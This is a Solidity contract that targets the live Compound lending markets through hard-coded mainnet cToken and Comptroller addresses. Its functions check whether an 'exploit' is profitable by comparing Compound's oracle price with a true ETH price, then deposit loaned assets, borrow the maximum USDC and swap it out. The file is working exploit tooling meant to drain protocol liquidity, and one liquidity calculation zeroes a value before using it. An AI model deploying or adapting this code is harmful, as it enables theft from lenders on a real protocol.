// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;


import {IERC20} from "src/interfaces/IERC20.sol";
import {ICErc20, ICEther, InterestRateModel, IComptroller, IUniswapAnchoredView, TokenConfig} from "src/interfaces/Compound.sol";
import {SwapUtils} from "src/utils/Uniswap/SwapUtils.sol";

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow, so we distribute
        return (a / 2) + (b / 2) + (((a % 2) + (b % 2)) / 2);
    }
}

contract CompoundUtils is SwapUtils {
    IComptroller public compound =
        IComptroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);

    ICEther cETH = ICEther(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    ICErc20 cUSDC = ICErc20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    ICErc20 cDAI = ICErc20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    IUniswapAnchoredView oracle; // The interface for the price oracle

    constructor() {
        address[] memory markets = new address[](3);

        markets[0] = address(cETH);
        markets[1] = address(cUSDC);
        markets[2] = address(cDAI);

        compound.enterMarkets(markets);

        oracle = IUniswapAnchoredView(compound.oracle());

        approveTokenMax(address(usdc), address(compound));
        approveTokenMax(address(dai), address(compound));
    }

    function getLivePosition(
        ICErc20 cToken
    ) public returns (uint256 deposits, uint256 borrows) {
        deposits = cToken.balanceOfUnderlying(address(this));

        //we can use non state changing now because we updated state with balanceOfUnderlying call
        borrows = cToken.borrowBalanceStored(address(this));
    }

    function getTargetEthDeposit(
        uint256 liquidityValue,
        ICErc20 cToken
    ) public view returns (uint256) {
        uint256 underlyingPriceEth = oracle.getUnderlyingPrice(address(cETH));
        uint256 underlyingPriceUsdc = oracle.getUnderlyingPrice(
            address(cToken)
        );
        uint256 valueOfLiquidityInEth = (liquidityValue * underlyingPriceUsdc) /
            underlyingPriceEth;

        (, uint256 collateralRatio, ) = compound.markets(address(cETH));

        uint256 targetEthDeposit = (valueOfLiquidityInEth * 1e18) /
            collateralRatio;

        return targetEthDeposit;
    }

    function getHypotheticalLiquidityValue(
        uint256 hypotheticalEthDeposit
    ) public view returns (uint256, uint256, uint256) {
        (, uint256 collateralRatio, ) = compound.markets(address(cETH));
        (uint256 error, uint256 liquidity, uint256 shortfall) = compound
            .getAccountLiquidity(address(this));

        uint256 hypotheticalLiquidityEth = (hypotheticalEthDeposit *
            collateralRatio) / 1e18;

        uint256 safetyFactor = 0.96 ether;
        uint256 safeLiquidityEth = (hypotheticalLiquidityEth * safetyFactor) /
            1e18;

        uint256 compEthPrice = oracle.getUnderlyingPrice(address(cETH));

        uint256 hypotheticalLiquidityValue = (safeLiquidityEth * compEthPrice) /
            1e18;

        if (hypotheticalLiquidityValue < shortfall) {
            shortfall = shortfall - hypotheticalLiquidityValue;
        } else {
            shortfall = 0;
            liquidity = hypotheticalLiquidityValue - shortfall + liquidity;
        }

        return (error, liquidity, shortfall);
    }

    function getCTokenLiquidityValue(
        ICErc20 cToken
    ) public view returns (uint256) {
        uint256 cTokenLiquidity = getCTokenLiquidity(cToken);
        uint256 underlyingPriceUsdc = oracle.getUnderlyingPrice(
            address(cToken)
        );

        uint256 cTokenLiquidityValue = (cTokenLiquidity * underlyingPriceUsdc) /
            1e18;

        return cTokenLiquidityValue;
    }

    function isExploitProfitable(
        uint256 hypotheticalEthDeposit,
        uint256 repaymentAmount
    ) public view returns (uint256, bool, uint256) {
        // Get value of liquidity if we deposited all eth
        (
            uint256 error,
            uint256 hypotheticalLiquidityValue,

        ) = getHypotheticalLiquidityValue(hypotheticalEthDeposit);
        if (error != 0) {
            return (0, false, 0);
        }

        // Get value of available cToken liquidity
        uint256 cTokenLiquidityValue = getCTokenLiquidityValue(cUSDC);

        uint256 targetDeposit = hypotheticalEthDeposit;
        uint256 remainingEth;

        // If cTokenLiquidity is lower than hypotheticalLiquidity, use cTokenLiquidity
        uint256 targetLiquidityValue = hypotheticalLiquidityValue;
        if (hypotheticalLiquidityValue > cTokenLiquidityValue) {
            targetDeposit = getTargetEthDeposit(cTokenLiquidityValue, cUSDC);
            targetLiquidityValue = cTokenLiquidityValue;
            remainingEth = hypotheticalEthDeposit - targetDeposit;
        }

        uint256 ethTruePrice = oracle.fetchEthPrice();
        uint256 recoverableEth = ((targetLiquidityValue / ethTruePrice) * 1e6) +
            remainingEth;


        if (recoverableEth > repaymentAmount) {
            return (recoverableEth - repaymentAmount, true, targetDeposit);
        } else {
            return (repaymentAmount - recoverableEth, false, 0);
        }
    }

    // Deposit all loaned asset into Compound
    function executeArb(address asset, uint256 depositTarget) public {
        if (asset == address(weth)) {
            TokenConfig memory config = oracle.getTokenConfigByUnderlying(
                address(0)
            );
            weth.withdraw(depositTarget);
            ICEther cToken = ICEther(config.cToken);
            cToken.mint{value: depositTarget}();
        } else {
            TokenConfig memory config = oracle.getTokenConfigByUnderlying(
                asset
            );
            ICErc20 cToken = ICErc20(config.cToken);
            cToken.mint(depositTarget);
        }

        borrowMax(cUSDC);
        uint256 usdcBalance = usdc.balanceOf(address(this));


        // Sell USDC for Original Asset
        swap(address(usdc), asset, usdcBalance);
    }

    function borrowMax(ICErc20 cToken) public returns (uint256) {
        (, uint256 liquidity, ) = compound.getAccountLiquidity(address(this));
        uint256 maxBorrowableValue = liquidity;
        uint256 price = oracle.getUnderlyingPrice(address(cToken));
        TokenConfig memory config = oracle.getTokenConfigByCToken(
            address(cToken)
        );
        uint256 maxBorrowable = ((maxBorrowableValue * price) / 1e36) /
            config.baseUnit;
        // uint256 success = cToken.borrow(maxBorrowable);
        cToken.borrow(maxBorrowable);
        return maxBorrowable;
    }

    function getCTokenLiquidity(ICErc20 cToken) public view returns (uint256) {
        uint256 totalCash = cToken.getCash();
        uint256 totalReserves = cToken.totalReserves();
        if (totalReserves > totalCash) {
            return 0;
        } else {
            return totalCash - totalReserves;
        }
    }
}
